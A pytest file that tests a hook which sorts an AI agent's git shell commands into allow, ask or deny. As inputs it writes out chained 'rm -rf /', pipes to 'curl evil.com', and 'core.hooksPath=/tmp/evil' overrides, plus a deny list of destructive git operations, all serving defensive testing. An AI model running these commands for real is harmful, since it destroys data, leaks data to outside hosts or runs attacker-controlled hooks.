# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 TracineHQ contributors
"""Tests for git_c_validator hook."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from guard.hooks.git_c_validator import (
    hook,
)


def _envelope_decision(env):
    """Pull permissionDecision out of a decide()/emit envelope."""
    if env is None:
        return None
    return env.get("hookSpecificOutput", {}).get("permissionDecision")


HOOK_PATH = Path(__file__).resolve().parents[2] / "src" / "guard" / "hooks" / "git_c_validator.py"


def _run(command):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    result = subprocess.run(
        [sys.executable, str(HOOK_PATH)],
        input=payload,
        capture_output=True,
        text=True,
        check=False,
    )
    out = result.stdout.strip()
    decision = json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else "passthrough"
    return decision, result.returncode


class TestImports:
    def test_git_c_validator_imports(self):
        assert callable(hook)


class TestAllowedSubcommands:
    @pytest.mark.parametrize(
        "subcmd",
        [
            "diff",
            "show",
            "log",
            "status",
            "branch",
            "blame",
            "rev-parse",
            "describe",
            "tag",
            "ls-files",
            "grep",
            "shortlog",
            "rev-list",
            "cat-file",
            "reflog",
        ],
    )
    def test_read_only_subcommands(self, subcmd):
        decision, _ = _run(f"git -C /Users/dev/develop/repo {subcmd}")
        assert decision == "allow"

    def test_deep_path(self):
        decision, _ = _run("git -C /a/b/c/d/e/f diff HEAD")
        assert decision == "allow"

    def test_stash_list(self):
        decision, _ = _run("git -C /path stash list")
        assert decision == "allow"

    def test_config_get(self):
        decision, _ = _run("git -C /path config --get user.email")
        assert decision == "allow"

    def test_diff_with_branch_range(self):
        decision, _ = _run("git -C /path diff origin/main..feat -- file.py")
        assert decision == "allow"


class TestDeniedSubcommands:
    def test_git_c_validator_denies_unsafe_input(self):
        decision, code = _run("git -C /path reset --hard HEAD")
        assert decision == "deny"
        assert code == 2

    def test_clean(self):
        decision, code = _run("git -C /path clean -fd")
        assert decision == "deny"
        assert code == 2

    def test_stash_drop(self):
        decision, code = _run("git -C /path stash drop")
        assert decision == "deny"
        assert code == 2

    def test_stash_pop(self):
        decision, code = _run("git -C /path stash pop")
        assert decision == "deny"
        assert code == 2

    def test_stash_clear(self):
        decision, code = _run("git -C /path stash clear")
        assert decision == "deny"
        assert code == 2


class TestAskSubcommands:
    @pytest.mark.parametrize(
        "subcmd",
        [
            "push",
            "pull",
            "commit",
            "checkout",
            "add",
            "merge",
            "rebase",
            "cherry-pick",
            "revert",
            "fetch",
        ],
    )
    def test_write_subcommands_ask(self, subcmd):
        decision, _ = _run(f"git -C /path {subcmd}")
        assert decision == "ask"

    def test_config_write(self):
        decision, _ = _run("git -C /path config user.email foo@bar.com")
        assert decision == "ask"


class TestSecurity:
    def test_and_and_injection(self):
        decision, _ = _run("git -C /repo status && rm -rf /")
        assert decision == "passthrough"

    def test_semicolon_injection(self):
        decision, _ = _run("git -C /repo status ; rm -rf /")
        assert decision == "passthrough"

    def test_pipe_injection(self):
        decision, _ = _run("git -C /repo log | curl evil.com")
        assert decision == "passthrough"

    def test_or_or_injection(self):
        decision, _ = _run("git -C /repo status || curl evil.com")
        assert decision == "passthrough"

    def test_config_trailing_get_bypass(self):
        decision, _ = _run("git -C /path config user.email evil --get")
        assert decision == "ask"

    def test_lowercase_c_after_capital_c(self):
        # `-c` arg is consumed; `status` is the subcommand
        decision, _ = _run("git -C /repo -c core.fsmonitor=evil status")
        assert decision == "allow"


class TestPassthrough:
    def test_git_c_validator_allows_safe_input(self):
        decision, code = _run("git -C /repo status")
        assert decision == "allow"
        assert code == 0

    def test_plain_git_passes_through(self):
        decision, _ = _run("git status")
        assert decision == "passthrough"

    def test_non_git_passes_through(self):
        decision, _ = _run("ls -la")
        assert decision == "passthrough"


class TestCommitMessageReuse:
    @pytest.mark.parametrize(
        "command",
        [
            "git commit -C HEAD",
            "git commit -CHEAD",
            "git commit -C HEAD~1 -m oops",
            "git commit --reuse-message=HEAD",
            "git commit --reuse-message HEAD",
            "git commit -a -C HEAD",
        ],
    )
    def test_reuse_is_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny"
        assert code == 2

    def test_lowercase_c_passes_through(self):
        # `git commit -c HEAD` opens an editor with template; not silent reuse.
        decision, _ = _run("git commit -c HEAD")
        assert decision == "passthrough"

    @pytest.mark.parametrize(
        "command",
        [
            "git -C /tmp commit -C HEAD",
            "git -C /tmp commit --reuse-message=HEAD",
            "git --git-dir=/tmp/.git commit -C HEAD",
            "git --git-dir /tmp/.git commit --reuse-message HEAD",
        ],
    )
    def test_reuse_with_global_flag_prefix_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny", f"reuse with global prefix not denied: {command!r}"
        assert code == 2


class TestDestructiveSubcommandFlags:
    """``branch -D``, ``tag -d``, ``remote remove`` etc. flip allow→deny."""

    @pytest.mark.parametrize(
        "command",
        [
            "git -C /tmp branch -D feature",
            "git -C /tmp branch -d merged",
            "git -C /tmp branch --delete feature",
            "git -C /tmp branch -m old new",
            "git -C /tmp branch -M force-rename",
            "git -C /tmp tag -d v1.0",
            "git -C /tmp tag --delete v1.0",
            "git -C /tmp remote remove origin",
            "git -C /tmp remote rm origin",
            "git -C /tmp remote rename old new",
        ],
    )
    def test_destructive_flag_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny", f"destructive flag missed: {command!r}"
        assert code == 2

    def test_branch_listing_still_allowed(self):
        decision, _ = _run("git -C /tmp branch -a")
        assert decision == "allow"

    def test_tag_listing_still_allowed(self):
        decision, _ = _run("git -C /tmp tag -l")
        assert decision == "allow"

    def test_remote_listing_still_allowed(self):
        decision, _ = _run("git -C /tmp remote -v")
        assert decision == "allow"


class TestDangerousPathsConfigKeys:
    """``-c core.hooksPath=...`` / ``-c core.attributesFile=...`` are denied.

    Any command-line override of these keys is malicious — the next git
    subcommand would load hooks/attributes from the override target.
    Both relative-path traversal (``../foo``) AND absolute paths
    (``/tmp/evil``) are equally dangerous, so the rule denies any value.
    Permanent settings go through ``git config``; repo-local hooks live in
    ``.git/hooks/``.
    """

    @pytest.mark.parametrize(
        "command",
        [
            # Traversal shapes
            "git -c core.hooksPath=../foo status",
            "git -c core.hooksPath=../../etc/x status",
            "git -c core.attributesFile=../../etc/x diff",
            "git -c core.AttributesFile=../bar log",  # case-insensitive key
            "git -C /repo -c core.hooksPath=../escape status",
            "git -c core.hooksPath=foo/../../escape status",
            # Absolute-path shapes (the gap closed by this branch)
            "git -c core.hooksPath=/tmp/evil status",
            "git -c core.hooksPath=/var/folders/x/evil status",
            "git -c core.attributesFile=/etc/gitattributes diff",
            # Relative path without traversal — still attacker-controlled
            "git -c core.hooksPath=hooks/local status",
            # Empty value still overrides; deny.
            "git -c core.hooksPath= status",
        ],
    )
    def test_dangerous_keys_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny", f"override not denied: {command!r}"
        assert code == 2

    def test_unrelated_key_passthrough(self):
        # Other config keys are not exec sinks — pass through to the rest
        # of the validator (which may allow/deny on its own).
        decision, _ = _run("git -c color.ui=../foo status")
        assert decision != "deny"

    @pytest.mark.parametrize(
        "command",
        [
            "git --config-env core.hooksPath=DANGER status",
            "git --config-env core.attributesFile=ENV diff",
            "git -C /repo --config-env core.hooksPath=X status",
        ],
    )
    def test_config_env_two_token_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny", f"two-token --config-env not denied: {command!r}"
        assert code == 2

    def test_config_env_two_token_unrelated_passthrough(self):
        decision, _ = _run("git --config-env color.ui=ENV status")
        assert decision != "deny"


class TestStashUnknownAction:
    """``git -C <path> stash <unknown>`` exercises the ``_decide_stash``
    fallthrough path.

    DENIED_STASH_ACTIONS denies ``pop|drop|clear``; ``list|show`` are
    allowed read-only. Anything else (``apply``, ``push``, ``save``,
    ``branch``) returns None from ``_decide_stash`` and the outer
    classifier resolves via the generic subcommand allowlist
    (``stash`` is in ``ALLOWED_SUBCOMMANDS``) → ``allow``. The point of
    this test is the fallthrough wiring, not the resulting decision —
    a regression that made ``_decide_stash`` raise or always-deny would
    show up here.
    """

    @pytest.mark.parametrize("action", ["apply", "push", "save", "branch"])
    def test_unknown_stash_action_resolves(self, action):
        decision, _ = _run(f"git -C /tmp/repo stash {action}")
        assert decision in {"allow", "ask"}, f"stash {action} fallthrough broken: got {decision}"

    def test_destructive_stash_actions_denied(self):
        for action in ("pop", "drop", "clear"):
            decision, code = _run(f"git -C /tmp/repo stash {action}")
            assert decision == "deny", f"stash {action} should deny"
            assert code == 2

    def test_readonly_stash_actions_allowed(self):
        for action in ("list", "show"):
            decision, _ = _run(f"git -C /tmp/repo stash {action}")
            assert decision == "allow", f"stash {action} should allow"


# ---------------------------------------------------------------------------
# In-process tests: exercise the module API directly so coverage is collected.
# The subprocess-based tests above protect the wire shape but don't contribute
# to line coverage of the source module (separate Python process).
# ---------------------------------------------------------------------------

from guard.hooks.git_c_validator import (
    _classify_subcommand,
    _decide_config,
    _decide_stash,
    _has_dangerous_paths_config,
    _is_commit_reuse,
    decide,
    has_shell_operators,
    parse_git_c_command,
)


class TestHasShellOperators:
    @pytest.mark.parametrize(
        "cmd",
        [
            "git -C /repo status && rm -rf /",
            "git -C /repo status || true",
            "git -C /repo status ; ls",
            "git -C /repo log | cat",
            'git -C /repo commit -m "unterminated',
        ],
    )
    def test_operators_detected(self, cmd):
        assert has_shell_operators(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "git -C /repo status",
            'git -C /repo commit -m "hello world"',
            "git -C /repo log --pretty='%H && %s'",
            "git -C /repo diff -- 'a;b.txt'",
        ],
    )
    def test_no_operators(self, cmd):
        assert has_shell_operators(cmd) is False


class TestParseGitC:
    def test_inline_dash_C(self):
        path, sub, rest = parse_git_c_command("git -C/repo status")
        assert path == "/repo"
        assert sub == "status"
        assert rest == []

    def test_space_dash_C(self):
        path, sub, rest = parse_git_c_command("git -C /repo log --oneline")
        assert path == "/repo"
        assert sub == "log"
        assert rest == ["--oneline"]

    def test_consumes_other_flag_args(self):
        # -c key=value should be skipped (flag-with-arg form)
        path, sub, _ = parse_git_c_command("git -C /repo -c color.ui=false status")
        assert path == "/repo"
        assert sub == "status"

    def test_not_git(self):
        assert parse_git_c_command("ls -la") == (None, None, [])

    def test_empty(self):
        assert parse_git_c_command("") == (None, None, [])

    def test_unterminated_quote(self):
        assert parse_git_c_command('git "abc') == (None, None, [])

    def test_no_subcommand(self):
        path, sub, rest = parse_git_c_command("git -C /repo")
        assert path == "/repo"
        assert sub is None
        assert rest == []


class TestClassifySubcommandDirect:
    @pytest.mark.parametrize(
        "sub",
        [
            "status",
            "log",
            "diff",
            "show",
            "blame",
            "rev-parse",
            "describe",
            "ls-files",
            "ls-tree",
            "grep",
            "shortlog",
            "cat-file",
            "rev-list",
            "name-rev",
            "for-each-ref",
            "reflog",
            "count-objects",
            "fsck",
            "verify-pack",
        ],
    )
    def test_read_only(self, sub):
        env = _classify_subcommand(sub, [])
        assert _envelope_decision(env) == "allow"

    @pytest.mark.parametrize("sub", ["reset", "clean"])
    def test_destructive(self, sub):
        env = _classify_subcommand(sub, [])
        assert _envelope_decision(env) == "deny"

    @pytest.mark.parametrize(
        "sub",
        ["push", "pull", "commit", "checkout", "switch", "merge", "rebase", "fetch", "cherry-pick"],
    )
    def test_unknown_asks(self, sub):
        env = _classify_subcommand(sub, [])
        assert _envelope_decision(env) == "ask"

    def test_destructive_flag_branch_dash_D(self):
        env = _classify_subcommand("branch", ["-D", "feature"])
        assert _envelope_decision(env) == "deny"

    def test_destructive_flag_tag_dash_d(self):
        env = _classify_subcommand("tag", ["-d", "v1"])
        assert _envelope_decision(env) == "deny"

    def test_destructive_flag_remote_remove(self):
        env = _classify_subcommand("remote", ["remove", "origin"])
        assert _envelope_decision(env) == "deny"

    def test_branch_listing_allowed(self):
        env = _classify_subcommand("branch", ["-a"])
        assert _envelope_decision(env) == "allow"


class TestDecideConfigDirect:
    @pytest.mark.parametrize(
        "flag",
        ["--get", "--list", "-l", "--get-all", "--get-regexp"],
    )
    def test_read_flags_allow(self, flag):
        env = _decide_config([flag, "user.email"])
        assert _envelope_decision(env) == "allow"

    def test_write_asks(self):
        env = _decide_config(["user.email", "foo@bar.com"])
        assert _envelope_decision(env) == "ask"

    def test_add_asks(self):
        env = _decide_config(["--add", "remote.origin.fetch", "+refs/heads/*"])
        assert _envelope_decision(env) == "ask"

    def test_unset_asks(self):
        env = _decide_config(["--unset", "user.email"])
        assert _envelope_decision(env) == "ask"

    def test_empty_asks(self):
        # `git -C x config` with no remaining args -> write-ish branch (ask).
        env = _decide_config([])
        assert _envelope_decision(env) == "ask"


class TestDecideStashDirect:
    @pytest.mark.parametrize("action", ["pop", "drop", "clear"])
    def test_destructive(self, action):
        env = _decide_stash([action])
        assert _envelope_decision(env) == "deny"

    @pytest.mark.parametrize("action", ["list", "show"])
    def test_readonly(self, action):
        env = _decide_stash([action])
        assert _envelope_decision(env) == "allow"

    def test_empty_remaining_falls_through(self):
        # `git stash` with no action -> None (caller resolves via allowlist)
        assert _decide_stash([]) is None

    @pytest.mark.parametrize("action", ["apply", "push", "save", "branch"])
    def test_unknown_falls_through(self, action):
        assert _decide_stash([action]) is None


class TestDangerousPathsConfigDirect:
    def test_canonical_two_token(self):
        hit = _has_dangerous_paths_config("git -c core.hooksPath=/tmp/evil status")
        assert hit is not None
        assert hit[0].lower() == "core.hookspath"

    def test_equals_form(self):
        hit = _has_dangerous_paths_config("git -c=core.hooksPath=/tmp/evil status")
        assert hit is not None

    def test_fused_short_flag(self):
        hit = _has_dangerous_paths_config("git -ccore.hooksPath=/tmp/evil status")
        assert hit is not None
        assert hit[0].lower() == "core.hookspath"

    def test_config_env_equals(self):
        hit = _has_dangerous_paths_config("git --config-env=core.hooksPath=DANGER status")
        assert hit is not None
        assert hit[1] == "<env-indirect>"

    def test_config_env_two_token(self):
        hit = _has_dangerous_paths_config("git --config-env core.attributesFile=ENV diff")
        assert hit is not None

    def test_unrelated_passthrough(self):
        assert _has_dangerous_paths_config("git -c color.ui=false status") is None

    def test_not_git(self):
        assert _has_dangerous_paths_config("ls -c foo=bar") is None

    def test_unterminated_quote(self):
        assert _has_dangerous_paths_config('git -c "x') is None

    def test_config_env_malformed_payload(self):
        # No '=' in payload -> not a key=value, skipped.
        assert _has_dangerous_paths_config("git --config-env=corehookspath status") is None


class TestIsCommitReuseDirect:
    @pytest.mark.parametrize(
        "cmd",
        [
            "git commit -C HEAD",
            "git commit -CHEAD",
            "git commit --reuse-message=HEAD",
            "git commit --reuse-message HEAD",
            "git -C /tmp commit -C HEAD",
        ],
    )
    def test_reuse(self, cmd):
        assert _is_commit_reuse(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "git commit -m hi",
            "git status",
            'git commit "unterm',
            "git -C /tmp status",
        ],
    )
    def test_not_reuse(self, cmd):
        assert _is_commit_reuse(cmd) is False


class TestDecideDirect:
    def test_shell_operator_falls_through(self):
        assert decide("git -C /repo status && rm -rf /") is None

    def test_dangerous_paths_config_denies(self):
        env = decide("git -C /repo -ccore.hooksPath=/tmp/evil status")
        assert _envelope_decision(env) == "deny"
        reason = env["hookSpecificOutput"]["permissionDecisionReason"]
        assert "core.hooksPath" in reason or "core.hookspath" in reason.lower()

    def test_commit_reuse_denied(self):
        env = decide("git commit -C HEAD")
        assert _envelope_decision(env) == "deny"

    def test_no_path_no_subcommand_falls_through(self):
        # `git -C /repo` alone -> path set, sub None -> None
        assert decide("git -C /repo") is None

    def test_plain_status_falls_through_without_C(self):
        # parse_git_c_command returns path=None, sub="status" -> None per decide
        assert decide("git status") is None

    def test_allowed_subcommand(self):
        env = decide("git -C /repo status")
        assert _envelope_decision(env) == "allow"

    def test_denied_subcommand(self):
        env = decide("git -C /repo reset --hard")
        assert _envelope_decision(env) == "deny"


class TestHookEntryPointDirect:
    """Drive ``hook()`` in-process so the JSON envelope branches are covered."""

    def test_non_bash_no_output(self, capsys):
        hook({"tool_name": "Read", "tool_input": {"command": "git -C /r status"}})
        out = capsys.readouterr().out
        assert out == ""

    def test_missing_tool_input(self, capsys):
        hook({"tool_name": "Bash"})
        assert capsys.readouterr().out == ""

    def test_tool_input_not_dict(self, capsys):
        hook({"tool_name": "Bash", "tool_input": "string"})
        assert capsys.readouterr().out == ""

    def test_empty_command(self, capsys):
        hook({"tool_name": "Bash", "tool_input": {"command": ""}})
        assert capsys.readouterr().out == ""

    def test_command_not_string(self, capsys):
        hook({"tool_name": "Bash", "tool_input": {"command": 42}})
        assert capsys.readouterr().out == ""

    def test_not_git_returns_silently(self, capsys):
        hook({"tool_name": "Bash", "tool_input": {"command": "ls -la"}})
        assert capsys.readouterr().out == ""

    def test_git_without_C_or_commit_silent(self, capsys):
        hook({"tool_name": "Bash", "tool_input": {"command": "git status"}})
        assert capsys.readouterr().out == ""

    def test_allow_envelope_emitted(self, capsys):
        hook(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "git -C /repo status"},
                "session_id": "s",
                "cwd": "/repo",
            }
        )
        out = capsys.readouterr().out.strip()
        env = json.loads(out)
        assert env["hookSpecificOutput"]["permissionDecision"] == "allow"

    def test_deny_envelope_exits_2(self, capsys):
        with pytest.raises(SystemExit) as excinfo:
            hook(
                {
                    "tool_name": "Bash",
                    "tool_input": {"command": "git -C /repo reset --hard"},
                    "session_id": "s",
                    "cwd": "/repo",
                }
            )
        assert excinfo.value.code == 2
        out = capsys.readouterr().out.strip()
        assert json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "deny"

    def test_ask_envelope(self, capsys):
        hook({"tool_name": "Bash", "tool_input": {"command": "git -C /repo push"}})
        env = json.loads(capsys.readouterr().out.strip())
        assert env["hookSpecificOutput"]["permissionDecision"] == "ask"

    def test_shell_operator_falls_through_silent(self, capsys):
        hook(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "git -C /repo status && rm -rf /"},
            }
        )
        assert capsys.readouterr().out == ""

    def test_fused_core_hookspath_denied(self, capsys):
        with pytest.raises(SystemExit) as excinfo:
            hook(
                {
                    "tool_name": "Bash",
                    "tool_input": {"command": "git -C /repo -ccore.hooksPath=/tmp/evil status"},
                    "session_id": "s",
                    "cwd": "/repo",
                }
            )
        assert excinfo.value.code == 2
        env = json.loads(capsys.readouterr().out.strip())
        assert env["hookSpecificOutput"]["permissionDecision"] == "deny"
        reason = env["hookSpecificOutput"]["permissionDecisionReason"]
        assert "core.hooksPath" in reason or "hookspath" in reason.lower()

    def test_unterminated_quote_falls_back_to_split(self, capsys):
        # shlex.split raises, hook falls back to str.split; first token != 'git'
        # path triggered, but if it IS 'git' without -C/-c/commit, returns silent.
        hook({"tool_name": "Bash", "tool_input": {"command": 'git "unterm'}})
        assert capsys.readouterr().out == ""

    def test_cwd_non_string_handled(self, capsys):
        # cwd is not a string -> normalized to None inside the hook, no crash.
        hook(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "git -C /repo status"},
                "cwd": 123,
            }
        )
        env = json.loads(capsys.readouterr().out.strip())
        assert env["hookSpecificOutput"]["permissionDecision"] == "allow"
